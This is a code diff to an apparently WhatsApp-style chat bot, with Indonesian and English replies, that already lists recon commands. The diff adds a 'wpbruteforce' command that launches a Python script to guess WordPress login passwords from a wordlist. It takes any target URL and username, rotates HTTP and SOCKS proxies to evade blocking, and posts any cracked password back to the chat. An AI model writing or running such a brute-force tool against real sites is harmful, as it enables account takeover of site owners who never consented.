@@ -68,8 +68,9 @@ case "help": {
             `• ${prefix}whois <domain>\n` +
             `• ${prefix}iplocation <ip>\n` +
             `• ${prefix}vulnscan <url>\n` +
-            `• ${prefix}sslinfo <domain>\n` + 
-            `• ${prefix}language`
+            `• ${prefix}sslinfo <domain>\n` +
+            `• ${prefix}language\n` +
+            `• ${prefix}wpbruteforce <url> <username> <wordlist> [proxy_files]`
         );
     } else {
         m.reply(
@@ -81,7 +82,8 @@ case "help": {
             `• ${prefix}iplocation <ip>\n` +
             `• ${prefix}vulnscan <url>\n` +
             `• ${prefix}sslinfo <domain>\n` +
-            `• ${prefix}bahasa`
+            `• ${prefix}bahasa\n` +
+            `• ${prefix}wpbruteforce <url> <username> <wordlist> [proxy_files]`
         );
     }
     break;
@@ -467,6 +469,80 @@ case "bahasa": {
     );
     break;
 }
+
+case 'wpbruteforce': {
+    const lang = getSettings().language;
+
+    if (!isCreator) return m.reply(mess.owner);
+
+    if (args.length < 3) {
+        return m.reply(
+            lang === 'en'
+                ? `${prefix}wpbruteforce <url> <username> <wordlist> [proxy_files]\nExample:\n` +
+                  `${prefix}wpbruteforce https://example.com admin /home/wordlist.txt python/http.txt\n` +
+                  `${prefix}wpbruteforce https://example.com admin /home/wordlist.txt python/socks4.txt python/socks5.txt`
+                : `${prefix}wpbruteforce <url> <username> <wordlist> [proxy_files]\nContoh:\n` +
+                  `${prefix}wpbruteforce https://example.com admin /home/wordlist.txt python/http.txt\n` +
+                  `${prefix}wpbruteforce https://example.com admin /home/wordlist.txt python/socks4.txt python/socks5.txt`
+        );
+    }
+
+    const url = args[0];
+    const username = args[1];
+    const wordlist = args[2];
+    const proxyFiles = args.slice(3); // Optional proxy
+
+    const pythonWP = spawn("python3", [
+        "python/wp_bruteforce.py",
+        url,
+        username,
+        wordlist,
+        ...proxyFiles
+    ]);
+
+    let wpOutput = "";
+    pythonWP.stdout.on("data", (data) => wpOutput += data.toString());
+    pythonWP.stderr.on("data", (err) => console.error(`[WPBF ERROR] ${err}`));
+
+    pythonWP.on("close", () => {
+        try {
+            const result = JSON.parse(wpOutput);
+            let message = "";
+
+            if (result.password_found) {
+                message =
+                    lang === "en"
+                        ? `🔓 *Brute Force Successful*\n` +
+                          `URL: ${result.url}\n` +
+                          `Username: ${result.username}\n` +
+                          `Password: ${result.password_found}\n` +
+                          `Proxies Used: ${result.proxies_used.length}x`
+                        : `🔓 *Brute Force Berhasil*\n` +
+                          `URL: ${result.url}\n` +
+                          `Username: ${result.username}\n` +
+                          `Password: ${result.password_found}\n` +
+                          `Proxy Digunakan: ${result.proxies_used.length}x`;
+            } else {
+                const errorLog = result.errors?.slice(-3).join('\n') || (lang === "en" ? '-' : '-');
+                message =
+                    lang === "en"
+                        ? `🔐 Brute Force Failed\n` +
+                          `Total Attempts: ${result.proxies_used.length}x\n` +
+                          `Last Errors:\n${errorLog}`
+                        : `🔐 Bruteforce Gagal\n` +
+                          `Total Percobaan: ${result.proxies_used.length}x\n` +
+                          `Error Terakhir:\n${errorLog}`;
+            }
+
+            m.reply(message);
+        } catch (e) {
+            m.reply(lang === "en" ? "❗ Failed to process result" : "❗ Gagal memproses hasil");
+        }
+    });
+
+    break;
+}
+
 
 // ==================== DEFAULT HANDLER ====================
 default: {
